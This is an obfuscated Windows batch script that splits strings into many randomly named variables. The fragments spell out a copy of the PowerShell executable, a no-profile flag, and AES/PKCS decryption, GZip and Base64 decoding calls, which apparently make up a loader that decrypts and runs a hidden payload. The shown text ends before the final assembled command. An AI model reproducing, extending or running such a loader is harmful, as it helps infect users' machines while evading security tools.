@echo off
set "XEOowiWZoN=em"
set "gfdrGEBDkx=we"
set "skNqiPEhqO=rS"
set "DPjOXLjMql=Po"
set "zSDvuZVzLk=po"
set "EbJWBHLaWI=s\"
set "PAHfLWUwhh=in"
set "TBugneLNwT=.e"
set "MnJiWUCxTZ=we"
set "MIWuNMcipE=y "
set "myYNDiYJzN=he"
set "AfDGHzqgkx=:\"
set "VSXgrufEEd=0\"
set "lQRbhHKRqT=32"
set "xnRhcLJRNb=Wi"
set "tOluHQOGzM=ll"
set "raVzOWKwyu=ws"
set "qvwGNlNfcy=ow"
set "BJLEqUiNkK=Sy"
set "QuhPZBpwhH=rs"
set "AZNdUQVcgn=co"
set "VDhZtlAzGA= C"
set "gcwBYooWEN=1."
set "JysdWJQAIs=xe"
set "XiyxyRKvtz=do"
set "fAxkebjMii= /"
set "qrLJYViTuZ=py"
set "kFWQvWROKI=nd"
set "HXeiMeqMDU=ll"
set "oxpCJozagZ=he"
set "tnCzctbTGi=\v"
set "ICwBgbRltR=st"
set "caUsQcFhPz=\W"
set "JvfIrMjWCN= %~dp0"
set "cUsmxUpTHT=cd"
set "WlFLotNjWP=ypto"
set "JXsKhTIHGE=W.En"
set "OWYPGWZZwu=urit"
set "VhcGOPVYYv=gMod"
set "XiWNJhCuku=oL'["
set "VYhgoTEZMc=S46e"
set "ZYccYwGqDS=gth)"
set "vRfYALdJqA=V = "
set "EqUmHQlecO='gni"
set "LMxfCLJyxp=.GZi"
set "BScMqrEItX=e]::"
set "LgDHzBoqPf=.Key"
set "LrPybDPLDZ=h = "
set "bnJapmiBli=vs.D"
set "YPAIxPDQLq=ZsYJ"
set "ARDxvLlNfE=($ML"
set "yNJllYizwP=pher"
set "QYNtBIRoIQ=ptog"
set "feYQuCrnBm=esMa"
set "pHkthnZNTI=.Cop"
set "pYIQwsXXhT=yste"
set "vgVpJvVjfl=null"
set "qJSVzpPWEE=ddin"
set "ftSMRIMGDG=PKCS"
set "DHtVoTTeiW=.Com"
set "jBUTmxUqkG=eo);"
set "aQPpHuvtCN='0Pg"
set "qnsPZztwGv=;$cv"
set "tuwjFMUueR=.IO."
set "uIHWXzSSum=tem."
set "LzATlQynVQ=[Sys"
set "GflpZTfCru=lit("
set "NJuNZFstRg=hy.A"
set "zjuJlQEmXQ=Fina"
set "RSvSpMjGxK=tsWi"
set "jQdGDyiNfa=nage"
set "OuoZGRbGnf=[Env"
set "xFoQCIQiGh=e = "
set "oFeGQflaRP=-nop"
set "svwzEbWKag=ct S"
set "KCjgWAyyJN=gjYA"
set "VZGKiljtHr=join"
set "gSATZpKtJs= [st"
set "HYTfqKVORK=6esa"
set "eXGFZBlPGY=esaB"
set "ThgmPWvnrk=.Cre"
